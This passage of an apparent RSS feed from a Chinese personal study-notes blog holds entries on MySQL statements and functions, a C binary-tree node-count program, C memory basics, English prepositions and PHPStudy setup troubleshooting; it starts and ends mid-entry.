SHOW ENGINES; # 显示二进制文件以及文件大小（需要开启二进制日志记录功能） SHOW {BINARY | MASTER} LOGS  # 显示二进制文件的执行过程 SHOW BINLOG EVENTS [IN &amp;#39;log_name&amp;#39;] [FROM pos] [LIMIT [offset,] row_count]  # 显示MySQL当前支持哪些字符集 SHOW CHARACTER SET [like_or_where]  # 显示MySQL支持字符集的排序规则 SHOW COLLATION [like_or_where]  # 显示表的列信息（等同于DESC，需要先创建表） SHOW [FULL] COLUMNS FROM tbl_name [FROM db_name] [like_or_where]  # 显示已经创建的库，创建时的语句 SHOW CREATE DATABASE db_name  # 显示已经创建的事件，创建时的语句 SHOW CREATE EVENT event_name  # 显示已经创建的函数，创建时的语句 SHOW CREATE FUNCTION func_name  # 显示已经创建的存储过程，创建时的语句 SHOW CREATE PROCEDURE proc_name  # 显示已经创建的表，创建时的语句 SHOW CREATE TABLE tbl_name  # 显示已经创建的触发器，创建时的语句 SHOW CREATE TRIGGER trigger_name  # 显示已经创建的视图，创建时的语句 SHOW CREATE VIEW view_name  # 显示mysql中所有数据库的名称 SHOW DATABASES [like_or_where]  # 显示存储引擎的详细信息 SHOW ENGINE engine_name {STATUS | MUTEX}  # 显示数据库支持的存储引擎和默认存储引擎 SHOW [STORAGE] ENGINES  # 显示最后一个执行语句所产生的错误信息 SHOW ERRORS [LIMIT [offset,] row_count]  # 显示事件信息 SHOW EVENTS  # 服务器内部调试，显示一个指定存储的内部实现的表示形式过程 SHOW FUNCTION CODE func_name  # 显示存储函数信息（需要先创建存储函数） SHOW FUNCTION STATUS [like_or_where]  # 显示指定用户拥有的权限 SHOW GRANTS FOR user  # 显示表索引信息（需要先创建索引） SHOW INDEX FROM tbl_name [FROM db_name]  # 显示Master当前正在使用的二进制信息 SHOW MASTER STATUS  # 列举在表缓存中当前被打开的非TEMPORARY表 SHOW OPEN TABLES [FROM db_name] [like_or_where]  # 显示MySQL插件信息 SHOW PLUGINS  # 服务器内部调试，显示一个指定存储的内部实现的表示形式过程 SHOW PROCEDURE CODE proc_name  # 显示存储过程信息（需要先创建存储过程） SHOW PROCEDURE STATUS [like_or_where]  # 显示MySQL所支持的所有权限，及权限可操作的对象 SHOW PRIVILEGES  # 显示系统中正在运行的所有进程，普通用户只能查看自己的进行信息 SHOW [FULL] PROCESSLIST  # 显示当前会话执行语句资源使用情况 SHOW PROFILE [types] [FOR QUERY n] [OFFSET n] [LIMIT n]  # 显示当前会话执行语句资源使用情况 SHOW PROFILES  # 显示relaylog事件信息（需要先做主从复制） SHOW RELAYLOG EVENTS [IN &amp;#39;log_name&amp;#39;] [FROM pos] [LIMIT [offset,] row_count]  # 显示Master主机上已注册的复制主机列表（需要先做主从复制） SHOW SLAVE HOSTS  # 显示Slave主机状态信息（需要先做主从复制） SHOW SLAVE STATUS [FOR CHANNEL channel]  # 显示MySQL状态信息 SHOW [GLOBAL | SESSION] STATUS [like_or_where]  # 显示表属性信息 SHOW TABLE STATUS [FROM db_name] [like_or_where]  # 显示当前数据库中所有表的名称 SHOW [FULL] TABLES [FROM db_name] [like_or_where]  # 显示触发器信息（需要先创建触发器） SHOW TRIGGERS [FROM db_name] [like_or_where]  # 显示MySQL变量信息 SHOW [GLOBAL | SESSION] VARIABLES [like_or_where]  # 显示最后一个执行语句所产生的警告信息 SHOW WARNINGS [LIMIT [offset,] row_count] </description>
    </item>
    
    <item>
      <title>MySQL UPDATE</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/dml/update/</link>
      <pubDate>Sat, 23 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/dml/update/</guid>
      <description>UPDATE 用于修改或更新数据库中表的数据。
修改表中的数据 mysql&amp;gt; update rainy set name=&amp;#39;zhu&amp;#39;where id=1; Query OK, 2 rows affected (0.03 sec) Rows matched: 2 Changed: 2 Warnings: 0 修改后重新查询表中的数据：
mysql&amp;gt; select * from rainy; +------+------+ | id | name | +------+------+ | 1 | zhu | | 1 | zhu | +------+------+ 2 rows in set (0.00 sec) </description>
    </item>
    
    <item>
      <title>MySQL 函数</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/%E5%87%BD%E6%95%B0/%E5%87%BD%E6%95%B0/</link>
      <pubDate>Sat, 23 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/%E5%87%BD%E6%95%B0/%E5%87%BD%E6%95%B0/</guid>
      <description>函数 函数之间可以嵌套
语法 SELECT 函数名(实参列表,表名) 单行函数 主要用于处理数据，传入一个参数，返回一个值。
 字符函数，传入的参数为字符串类型。 数学函数，传入的参数为数字类型。 日期函数，传入的参数为日期类型。 其他函数 流程控制函数，可以实现一些分支结构。  分组函数 主要用于统计数据，传入一组参数，并返回一个值，也叫统计函数、组函数、聚合函数。</description>
    </item>
    
    <item>
      <title>MySQL 数学函数</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/%E5%87%BD%E6%95%B0/%E5%8D%95%E8%A1%8C%E5%87%BD%E6%95%B0/%E6%95%B0%E5%AD%A6%E5%87%BD%E6%95%B0/</link>
      <pubDate>Sat, 23 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/%E5%87%BD%E6%95%B0/%E5%8D%95%E8%A1%8C%E5%87%BD%E6%95%B0/%E6%95%B0%E5%AD%A6%E5%87%BD%E6%95%B0/</guid>
      <description>数学函数 用于对数字进行处理，或者返回一个数值。
ROUND(X,D) 计算将 X 四舍五入后，保留 D 位小数后的值。
SELECT ROUND(45.4) CEIL(X) 计算将 X 向上取整后的值，这个值 &amp;gt;= X 的最小整数。
SELECT CEIL(1.52) # 返回 1 SELECT CEIL(1) FLOOR(X) 计算将 X 向下取整后的值，这个值 &amp;lt;= X 的最大整数。
SELECT FLOOR(1.2) # 返回 1 SELECT FLOOR(9.9) TRUNCATE(X,D) 不将 X 进行四舍五入，直接保留 D 位小数，或者说是直接截断。
SELECT TRUNCATE(1.69999,2) MOD(N,M) 计算用 N 除以 M 的余数，相当于 N % M。
但%实际上的计算过程是N - (N/M*M)。
SELECT MOD(10,3) # 相当于 SELECT 10 % 3 </description>
    </item>
    
    <item>
      <title>MySQL 日期函数</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/%E5%87%BD%E6%95%B0/%E5%8D%95%E8%A1%8C%E5%87%BD%E6%95%B0/%E6%97%A5%E6%9C%9F%E5%87%BD%E6%95%B0/</link>
      <pubDate>Sat, 23 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/%E5%87%BD%E6%95%B0/%E5%8D%95%E8%A1%8C%E5%87%BD%E6%95%B0/%E6%97%A5%E6%9C%9F%E5%87%BD%E6%95%B0/</guid>
      <description>日期函数 用于对日期进行处理，或者返回一个日期的值。
日期格式符号    格式符 功能     %Y 四位的年份   %y 两位的年份   %m 月份(01 - 12)   %c 月份(1 - 12)   %d 日(01, 02, …)   %H 小时(24 小时制)   %h 小时(12 小时制)   %i 分钟(00 - 59)   %s 秒(00 - 59)   %U 星期(0 - 52)，星期天为第一天   %u 星期(0 - 52)，星期一为第一天   %W 星期英文(Sunday — Saturday)   %M 月份英文(January — December)    NOW() 返回系统当前的日期和时间。</description>
    </item>
    
    <item>
      <title>MySQL 模糊查询</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/dql/%E6%9D%A1%E4%BB%B6%E6%9F%A5%E8%AF%A2/%E6%A8%A1%E7%B3%8A%E6%9F%A5%E8%AF%A2/</link>
      <pubDate>Sat, 23 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/dql/%E6%9D%A1%E4%BB%B6%E6%9F%A5%E8%AF%A2/%E6%A8%A1%E7%B3%8A%E6%9F%A5%E8%AF%A2/</guid>
      <description>模糊查询 LIKE 查询某个字段中所有包含单个或多个字符的数据
查询员工名中第三个字符为 n，第五个字符为 l 的员工名和工资 _通配符，表示匹配任意单个字符。
SELECT last_name, salary FROM employees WHERE last_name LIKE # 第三个字符为 n，第五个字符为 l 的数据 &amp;#39;__n_l%&amp;#39;; 查询员工名中第二个字符为 _ 的员工名 \转义字符，表示特殊的控制意义，一般用于格式控制。
SELECT last_name, salary FROM employees WHERE last_name LIKE &amp;#39;_\_%&amp;#39;; ESCAPE关键字可以让我们自定义转义字符。
SELECT last_name, salary FROM employees WHERE last_name LIKE &amp;#39;_$_%&amp;#39; # 自定义一个转义字符 $ ESCAPE &amp;#39;$&amp;#39;; 查询员工名中包含字符 a 的员工信息 %通配符，表示匹配任意多个字符，且包含 0 个字符。
SELECT * FROM employees WHERE last_name LIKE # % 表示匹配任意内容的意思 # 这里的 % 表示匹配 a 字符前面和后面都有任意字符的数据 &amp;#39;%a%&amp;#39;; BETWEEN AND 查询某个字段中所有在&amp;hellip;和&amp;hellip;之间的数据。</description>
    </item>
    
    <item>
      <title>MySQL 流程控制函数</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/%E5%87%BD%E6%95%B0/%E5%8D%95%E8%A1%8C%E5%87%BD%E6%95%B0/%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6%E5%87%BD%E6%95%B0/</link>
      <pubDate>Sat, 23 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/%E5%87%BD%E6%95%B0/%E5%8D%95%E8%A1%8C%E5%87%BD%E6%95%B0/%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6%E5%87%BD%E6%95%B0/</guid>
      <description>流程控制函数 IF IF(expr1,expr2,expr3) 如果 expr1 为 true，则返回 expr2 的值，否则返回 expr3 的值。
SELECT IF(10&amp;gt;5,&amp;#39;大&amp;#39;,&amp;#39;小&amp;#39;) 查询所有员工是否都有奖金 SELECT last_name,commission_pct,IF(commission_pct IS NOT NULL,&amp;#39;有奖金&amp;#39;,&amp;#39;无奖金&amp;#39;) AS 有无奖金 FROM employees CASE 它可以当成语句用，也可以当作表达式用。
他有两种用法，第一种用法类似于 switch 语句；第二种用法类似于 多重 if 语句。
查询员工的工资，要求： 部门号 = 30，显示原工资的 1.1 倍。
部门号 = 40，显示原工资的 1.2 倍。
部门号 = 50，显示原工资的 1.3 倍。
其他部门，显示原工资。
SELECT salary, department_id, # 如果 department_id 等于下面 WHEN 后面的任意值，则执行这个值对应的 THEN 后面的语句。 CASE department_id 	WHEN 30	THEN salary * 1.1 	WHEN 40 THEN salary * 1.</description>
    </item>
    
    <item>
      <title>MySQL ALTER</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/ddl/alter/</link>
      <pubDate>Fri, 22 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/ddl/alter/</guid>
      <description>ALTER 修改数据表名或者修改数据表的字段.
修改表名 ALTER TABLE 旧表名 RENAME 新表名。
ALTER TABLE rainy RENAME Su; 修改字段 ALTER TABLE 表名 CHANGE 旧字段名 新字段名 新数据类型。
ALTER TABLE su CHANGE rainy apple VARCHAR(20); 修改字段的排列位置 ALTER TABLE 表名 MODIFY 字段名 1 VARCHAR(20) AFTER 字段名 2;
ALTER TABLE su MODIFY rainy VARCHAR(20) AFTER two; 删除字段 </description>
    </item>
    
    <item>
      <title>MySQL 分组函数</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/%E5%87%BD%E6%95%B0/%E5%88%86%E7%BB%84%E5%87%BD%E6%95%B0/%E5%88%86%E7%BB%84%E5%87%BD%E6%95%B0/</link>
      <pubDate>Fri, 22 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/%E5%87%BD%E6%95%B0/%E5%88%86%E7%BB%84%E5%87%BD%E6%95%B0/%E5%88%86%E7%BB%84%E5%87%BD%E6%95%B0/</guid>
      <description>分组函数 与分组函数一同查询的字段要求是GROUP BY后的字段。
SUM 统计表中字段的和。
一般用于处理数值类型，计算时会忽略 NULL 值。
SELECT SUM(salary) FROM employees; AVG 统计表中字段的平均值。
一般用于处理数值类型，计算时会忽略 NULL 值。
SELECT AVG(salary) FROM employees; MAX 统计表中字段的最大值，可以处理任何数据类型，计算时会忽略 NULL 值。
SELECT MAX(salary) FROM employees; MIN 统计表中字段的最小值，可以处理任何数据类型，计算时会忽略 NULL 值。
SELECT MIN(salary) FROM employees; COUNT 统计表的行数，可以处理任何数据类型，计算时会忽略 NULL 值。
查询总行数 SELECT COUNT(*)FROM employees </description>
    </item>
    
    <item>
      <title>MySQL 字符函数</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/%E5%87%BD%E6%95%B0/%E5%8D%95%E8%A1%8C%E5%87%BD%E6%95%B0/%E5%AD%97%E7%AC%A6%E5%87%BD%E6%95%B0/</link>
      <pubDate>Fri, 22 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/%E5%87%BD%E6%95%B0/%E5%8D%95%E8%A1%8C%E5%87%BD%E6%95%B0/%E5%AD%97%E7%AC%A6%E5%87%BD%E6%95%B0/</guid>
      <description>字符函数 用于对字符进行处理，并返回一个字符串值。
字符串的索引都是从 1 开始的。
LENGTH(str) 返回 str 的字节长度。
在不同的字符集中，一个汉字和一个英文字母的字节长度都是不一样的。
SELECT # 在 uft-8 字符集中，一个英文和一个空格只占一个字符，一个汉字占三个字节 LENGTH(&amp;#39;Rainy 是憨憨&amp;#39;) AS 字符长度; CONCAT(str1,str2,&amp;hellip;) 将 str 1 与 str2 拼接起来，支持多个字符串。
SELECT CONCAT(last_name,&amp;#39;-&amp;#39;,first_name) AS 姓名 FROM employees; UPPER(str) 将 str 中的小写字母转为大写字母。
SELECT UPPER(&amp;#39;rainy&amp;#39;) AS 转大写 LOWER(str) 将 str 中的大写字母转为小写字母。
SELECT LOWER(&amp;#39;RAINY&amp;#39;) AS 转小写 SUBSTR(str FROM pos FOR len) 指定一个 str，从索引为 pot 的字符开始截取，一直截取到索引 len 的字符为止。若只有 pot ，则截取到最后，
SELECT SUBSTR(&amp;#39;臣世雨是个憨憨&amp;#39;,6) AS 截取至最后, SUBSTR(&amp;#39;臣世雨是个憨憨&amp;#39;,4,6) AS 截取至指定位置 INSTR(str,substr) 返回 substr 在 str 中第一次出现的索引，如果 str 中不存在 substr，则返回 0。</description>
    </item>
    
    <item>
      <title>MySQL 排序查询</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/dql/%E6%8E%92%E5%BA%8F%E6%9F%A5%E8%AF%A2/%E6%8E%92%E5%BA%8F%E6%9F%A5%E8%AF%A2/</link>
      <pubDate>Fri, 22 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/dql/%E6%8E%92%E5%BA%8F%E6%9F%A5%E8%AF%A2/%E6%8E%92%E5%BA%8F%E6%9F%A5%E8%AF%A2/</guid>
      <description>排序查询 语法 SELECT 查询列表 FROM 表名 WHERE 筛选条件 ORDER BY 排序列表 ASC DESC 升序/降序 特点  ASC 代表升序，DESC 代表降序，如果不写，则默认是升序。 支持单个字段、多个字段、表达式、函数、别名等。 一般放在查询语句的最后面，limit 语句除外。  按字段排序 查询员工信息，并按工资从高至低排序 SELECT * FROM employees WHERE salary # 降序 用 DESC ，升序用 ASC ORDER BY salary DESC; 按多个字段排序 查询员工信息，并先按工资升序，再按员工编号降序 如果有两种排序规则，若第一种排序规则中有相同的数据，那么这两个数据应该哪个在前，哪个在后呢？这时候会按照第二种排序规则进行排序，决定第一种排序规则中的相同数据的先后顺序。
SELECT *, salary AS 工资, employee_id AS 员工编号 FROM employees ORDER BY salary ASC,employee_id DESC; 按表达式排序 查询部门编号 &amp;gt;= 90 的员工信息，并按入职的先后顺序排序 SELECT * FROM employees WHERE department_id &amp;gt;= 90 # 降序 用 DESC ，升序用 ASC ORDER BY salary ASC; 按表达式排序 SELECT *, # 因为表中没有年薪这个字段，所以我们需要用表达式来计算每个员工的年薪 salary * 12*(1 + IFNULL(commission_pct,0)) AS 年薪 FROM employees ORDER BY salary * 12*(1 + IFNULL(commission_pct,0)) DESC; 按别名排序 查询员工的信息和年薪，并按年薪的高低排序 SELECT *, # 因为表中没有年薪这个字段，所以我们需要用表达式来计算每个员工的年薪 salary * 12*(1 + IFNULL(commission_pct,0)) AS 年薪 FROM employees # 用表达式所对应的别名来替代表达式，使得语句更好理解 ORDER BY 年薪 DESC; 按函数排序 查询远东的姓名和工资，并按姓的字节长度从多到少排序 SELECT LENGTH(last_name) AS 字节长度, last_name,salary FROM employees ORDER BY LENGTH(last_name) DESC;  </description>
    </item>
    
    <item>
      <title>二叉树的节点数量</title>
      <link>https://note.yxzi.xyz/note/technology/datastructure/algorithm/tree/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E8%8A%82%E7%82%B9%E6%95%B0%E9%87%8F/</link>
      <pubDate>Thu, 21 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/datastructure/algorithm/tree/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E8%8A%82%E7%82%B9%E6%95%B0%E9%87%8F/</guid>
      <description>二叉树的节点数量 递归法  判断根节点是否有左右子节点，有则递归调用NodeNum()，则子节点 + 1。 左右子节点数量加上根节点数量。  ·include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; // 定义节点 typedef struct node {  int data;  struct node *lchild, *rchild; } n;  // 创建一个节点 node * get_a_node(int data) {  node *c = (node *)malloc(sizeof(node));  c-&amp;gt;data = data;  c-&amp;gt;lchild = 0;  c-&amp;gt;rchild = 0;  return c; }   // *p：根节点 int NodeNum(node *p) {  // 节点总数  int nums;   // 左节点数量  int left = 0;   // 右节点数量  int right = 0;   // 有左节点  if (p-&amp;gt;lchild)  {  // 左节点 + 1  left = NodeNum(p-&amp;gt;lchild);  }  // 有右节点  if (p-&amp;gt;rchild)  {  // 右节点 + 1  right = NodeNum(p-&amp;gt;rchild);  }  // 左右节点数量加上根节点数量  // 这个 + 1 很重要，因为每次调用 NodeNum()，就说明有节点，则 nums + 1。  nums = left + right + 1;  return nums; }   int main(void) {  // 构建二叉树  node *t = get_a_node(1);  t-&amp;gt;lchild = get_a_node(2);  t-&amp;gt;rchild = get_a_node(3);  t-&amp;gt;lchild-&amp;gt;rchild = get_a_node(5);  t-&amp;gt;rchild-&amp;gt;rchild = get_a_node(7);  t-&amp;gt;rchild-&amp;gt;rchild-&amp;gt;lchild = get_a_node(14);   int num = NodeNum(t);  printf(&amp;#34;二叉树的结点个数为：%d\n&amp;#34;,num);  return 0; } </description>
    </item>
    
    <item>
      <title>启动 MySQL</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/%E5%90%AF%E5%8A%A8-mysql-/</link>
      <pubDate>Thu, 21 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/%E5%90%AF%E5%8A%A8-mysql-/</guid>
      <description>启动 MySQL 使用命令行 Window 操作系统中 Ctrl + Alt 打开 CMD，通过下面两条命令启动或关闭 MySQL
net start mysql # 启动 MySQL net stop mysql # 关闭 MySQL 提示服务名无效 C:\Windows\system32&amp;gt;net start mysql 服务名无效。  请键入 NET HELPMSG 2185 以获得更多的帮助。 在 MySQL 安装目录下的 bin 目录下打开管理员的 cmd，并输入命令**.\mysqld.exe install**，回车即可：
D:\AppInstallPath\PhpStudy\phpstudy_pro\Extensions\MySQL5.7.26\bin&amp;gt;.\mysqld.exe install Service successfully installed. 使用 PHPStudy 首页，直接启动 MySQL 即可，如果提示端口被占用，修改端口号即可。
登录服务端 隐藏密码登录 MySQL -h localhost -P 3306 -u root -p -h表示主机。
-P表示端口号。
-u表示用户名。
-p表示密码。
输入命令后 Enter。
MySQL -h localhost -P 3306 -u root -p Enter password: 输入密码，登录成功。</description>
    </item>
    
    <item>
      <title>C Null</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/null/</link>
      <pubDate>Wed, 20 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/null/</guid>
      <description>Null 二进制全部为零时有几种含义，为什么会有几种含义呢，这是因为解码的方式不同：
 数值零。（数值解码） 字符串结束标记符&#39;\0&#39;（字母解码） 空指针Null，此时的Null本质也是零，但这个零不代表数字 0：int i = 0，而表示某个内存单元的地址为零（地址解码）  另外，我们计算机规定，以零（Null）为地址的储存单元的内容不可读，也不可写。</description>
    </item>
    
    <item>
      <title>C 分配内存和释放内存</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E5%9F%BA%E7%A1%80/%E5%88%86%E9%85%8D%E5%86%85%E5%AD%98%E5%92%8C%E9%87%8A%E6%94%BE%E5%86%85%E5%AD%98/</link>
      <pubDate>Wed, 20 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E5%9F%BA%E7%A1%80/%E5%88%86%E9%85%8D%E5%86%85%E5%AD%98%E5%92%8C%E9%87%8A%E6%94%BE%E5%86%85%E5%AD%98/</guid>
      <description>分配内存和释放内存 分配内存 操作系统会将某一块内存空间的控制权限，交给程序。
释放内存 释放内存，可以用 C 语言中的free();函数来实现。
程序会将某一块内存空间的控制权限，交还给操作系统，使得这个程序无法对这块区域进行操作。而不是将这一块内存空间中的数据清空。</description>
    </item>
    
    <item>
      <title>C 变量为什么要初始化</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E5%9F%BA%E7%A1%80/%E5%8F%98%E9%87%8F%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%88%9D%E5%A7%8B%E5%8C%96/</link>
      <pubDate>Wed, 20 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E5%9F%BA%E7%A1%80/%E5%8F%98%E9%87%8F%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%88%9D%E5%A7%8B%E5%8C%96/</guid>
      <description>变量为什么要初始化 初始化，也叫赋值，变量不进行初始化，那么这个变量中所存放的数据就是垃圾值。
垃圾值 垃圾值（随机值）指的是其他程序使用某个内存空间所遗留下来的值。
VC++ 若发现某个变量的内存空间内有垃圾值（即该变量没进行初化），那么它会将该垃圾值替换为填充值。目的是为了避免开发者将垃圾值当做一个正常值来使用，也就是提醒开发者这个变量没有进行初始化。因此，变量若未进行初始化，该变量的内存空间内存放的是一个垃圾值。</description>
    </item>
    
    <item>
      <title>C 变量的定义和赋值</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E5%9F%BA%E7%A1%80/%E5%8F%98%E9%87%8F%E7%9A%84%E5%AE%9A%E4%B9%89%E5%92%8C%E8%B5%8B%E5%80%BC/</link>
      <pubDate>Wed, 20 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E5%9F%BA%E7%A1%80/%E5%8F%98%E9%87%8F%E7%9A%84%E5%AE%9A%E4%B9%89%E5%92%8C%E8%B5%8B%E5%80%BC/</guid>
      <description>变量的定义和赋值 系统是如何执行 int i = 5; 这个语句的  程序请求操作系统为 i 分配存储空间。 操作系统会在内存中寻找一块空闲的内存空间，将这个内存空间当作 i 来使用。 程序会将 i 和这块内存空间关联起来，也就是将 i 当作这块内存空间的名字，使得以后对 i 这个字母进行操作，就相当于对这块内存空间进行，操作。 最后将 5 存储到 i 中，也就是存储到这块空闲的区域中。  </description>
    </item>
    
    <item>
      <title>English for</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/for/</link>
      <pubDate>Wed, 20 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/for/</guid>
      <description>for 表示目的、目标、用途  为了&amp;hellip; 替代&amp;hellip; 对于&amp;hellip; 帮&amp;hellip; 给&amp;hellip;  为了&amp;hellip; for + 一个人/物，表示为了某个目标或为了某个人。
 Many people learn English for work. Girls make up for men. I run every morning for health.  给&amp;hellip; 需要，当 for 表示“给&amp;hellip;”的意思的时候，这时候的 for 不是动词“给”的意思。
 The letter is for you. The apple is for you. The packet is for me.  对于&amp;hellip; for + 一些词语构成固定搭配，可以表示“对于&amp;hellip;”的意思。
 Tea is good for your health.  表示时间、距离、数量  厉经  for + 冠词/数词 + 表示时间的名词 表示时间延续了多久。</description>
    </item>
    
    <item>
      <title>English from</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/from/</link>
      <pubDate>Wed, 20 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/from/</guid>
      <description>from 表示时间和地点的起点  从&amp;hellip; 自&amp;hellip;  From +时间点 + to/till + 另一个时间点，这个句型表示从一个时间点到另一个时间点。
 We have a class from 20:00 to 22:00 every evening.  from + 一个地点 + to + 另外一个地点，这个句型表示从一个地方到林另外一个地方。
 The beggar asks for food from door to door. I run from my house ro the school. She walked from her house to the park yesterday.  from 是一个非常特别的介词，一般的介词后面不能跟地点副词，但是 from 可以。
 from here. from abroad.  从&amp;hellip;  She just came back from the school.</description>
    </item>
    
    <item>
      <title>English inside</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/inside/</link>
      <pubDate>Wed, 20 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/inside/</guid>
      <description>inside in 和 inside 的区别主要有两个。
inside 一般不能表示时间概念，特殊情况除外，in 经常可以表示时间的概念。inside 一般不能 + 大地方名词，而 in 可以 + 大地方名词/小地方的名词。
表示时间、地点 inside + 小地方 inside + 表示地点的词构成介词短语作地点状语，表示在某个地方里。
 They played inside the yard.  </description>
    </item>
    
    <item>
      <title>English like</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/like/</link>
      <pubDate>Wed, 20 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/like/</guid>
      <description>like 表示像某个东西 like + 表示人或物的词语 表示像某个人或某个物一样。
 The leaf is like a heart. She is like her mother. You should marry a man like me.  固定搭配 look like + 名词/代词宾格 表示看起来某个事物。
 She looks like a singer. The moom looks likes a silver plate. It looks like rain today.  </description>
    </item>
    
    <item>
      <title>启动服务器时报错</title>
      <link>https://note.yxzi.xyz/note/technology/softwareuse/phpstudy/%E5%90%AF%E5%8A%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%97%B6%E6%8A%A5%E9%94%99/</link>
      <pubDate>Wed, 20 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/softwareuse/phpstudy/%E5%90%AF%E5%8A%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%97%B6%E6%8A%A5%E9%94%99/</guid>
      <description>启动服务器时报错 今天，我在 PHPStudy 中启动 Apache 和 Nginx 的时候，启动失败，提示 AH&amp;hellip;
这是因为 PHPStudy 不能被安装到带有空格的文件夹中，否则 Apache 或 Nginx 就会会无法启动。</description>
    </item>
    
    <item>
      <title>提示 hosts 不同步</title>
      <link>https://note.yxzi.xyz/note/technology/softwareuse/phpstudy/%E6%8F%90%E7%A4%BA-hosts-%E4%B8%8D%E5%90%8C%E6%AD%A5/</link>
      <pubDate>Wed, 20 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/softwareuse/phpstudy/%E6%8F%90%E7%A4%BA-hosts-%E4%B8%8D%E5%90%8C%E6%AD%A5/</guid>
      <description>提示 hosts 不同步 大概率是C:\Windows\System32\drivers\etc 路径中的 hosts 出现了一下问题：
 hosts 文件的后缀名不对，hosts 文件没有后缀名。 hosts 中的内容为空。 hosts 内容底部没有添加网站域名  # Copyright (c) 1993-1999 Microsoft Corp.  # This is a sample HOSTS file used by Microsoft TCP/IP for Windows.  # This file contains the mappings of IP addresses to host names. Each  # entry should be kept on an individual line. The IP address should  # be placed in the first column followed by the corresponding host name.</description>
    </item>
    
    <item>
      <title>无法启动 MySQL</title>
      <link>https://note.yxzi.xyz/note/technology/softwareuse/phpstudy/%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8-mysql/</link>
      <pubDate>Wed, 20 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/softwareuse/phpstudy/%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8-mysql/</guid>
      <description>无法启动 MySQL 错误一 打开 PHPStudy，启动 MySQL 失败，但用 CMD 可以正常启动 MySQL。
5.7.26 解决方案 管理员运行 CMD 输入：
